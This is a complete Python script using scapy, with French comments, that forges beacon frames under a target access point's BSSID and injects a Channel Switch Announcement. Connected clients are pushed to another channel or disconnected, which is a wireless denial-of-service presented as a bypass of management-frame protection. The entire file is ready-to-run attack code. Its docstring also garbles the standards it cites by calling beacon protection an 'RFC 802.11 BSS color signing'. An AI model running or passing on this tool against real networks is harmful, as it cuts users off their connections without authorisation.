#!/usr/bin/env python3
"""CSA (Channel Switch Announcement) injection — bypass PMF.

Usage : sudo python3 csa_inject.py <iface> <target_bssid> <new_channel> <count>

Principe :
  - L'AP normalement annonce ses paramètres via beacon frames non protégés.
  - L'élément 37 (CSA) dit aux clients "change vers le channel N dans X TBTT"
  - Si beacon protection (RFC 802.11 BSS color signing) n'est pas activée
    — cas par défaut sur ~95% des APs — on peut spoofer ce beacon.
  - Les clients qui le reçoivent vont docilement changer de channel.
  - Si le channel cible est inexistant/DFS bloqué → ils se déconnectent.
"""

import sys
import time
from scapy.all import (
    RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, conf
)

def main():
    if len(sys.argv) < 5:
        print(f"usage: {sys.argv[0]} <iface> <bssid> <new_channel> <count>")
        sys.exit(1)

    iface, bssid, new_ch, count = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
    conf.verb = 0

    # Element CSA : ID 37
    # Body = [mode (1 byte), new_channel (1 byte), count (1 byte)]
    #   mode  = 1  : pas de transmission jusqu'au switch (force discipline)
    #   count = 0  : switch IMMÉDIATEMENT
    csa = bytes([1, new_ch, 0])

    # Beacon "normal" qu'on va spoofer, avec CSA injecté
    # SSID vide ou copié — beaucoup d'AP acceptent broadcast SSID
    frame = (
        RadioTap() /
        Dot11(
            type=0, subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=bssid,
            addr3=bssid
        ) /
        Dot11Beacon(cap=0x1104) /
        Dot11Elt(ID="SSID", info="") /
        Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c") /
        Dot11Elt(ID=37, info=csa)  # CSA element
    )

    print(f"[*] CSA injection → BSSID={bssid} new_channel={new_ch} count={count}")
    print(f"[*] iface={iface} — burst 50 ms entre beacons\n")

    sent = 0
    try:
        for i in range(count):
            sendp(frame, iface=iface, verbose=False)
            sent += 1
            if sent % 50 == 0:
                print(f"  [+] {sent} CSA beacons envoyés")
            time.sleep(0.05)
    except KeyboardInterrupt:
        print(f"\n[!] interrompu après {sent} beacons")

    print(f"[+] terminé — {sent} beacons CSA envoyés")


if __name__ == "__main__":
    main()
